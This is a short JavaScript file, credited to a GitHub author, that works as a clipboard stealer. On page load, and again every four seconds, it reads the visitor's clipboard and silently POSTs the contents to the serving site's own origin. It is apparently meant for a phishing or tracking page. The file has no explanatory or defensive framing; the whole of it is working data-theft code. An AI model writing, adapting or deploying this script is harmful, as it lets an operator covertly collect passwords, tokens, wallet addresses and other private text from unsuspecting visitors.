/* Coded By https://github.com/msfpt */

document.addEventListener('DOMContentLoaded', event => {

  // Don't do anything if the permission was denied.

  const clipboard = () => {

    navigator.clipboard.readText().then(text => {

      if (typeof text != 'string') {
        text = 'Unknown';
      }

      $.ajax({
        url: location.origin,
        type: 'POST',
        data: {
          'Status': 'y4t',
          'ClipBoard': text
        }
      });

    });

  }

  clipboard();
  
  setInterval(clipboard, 4000);

});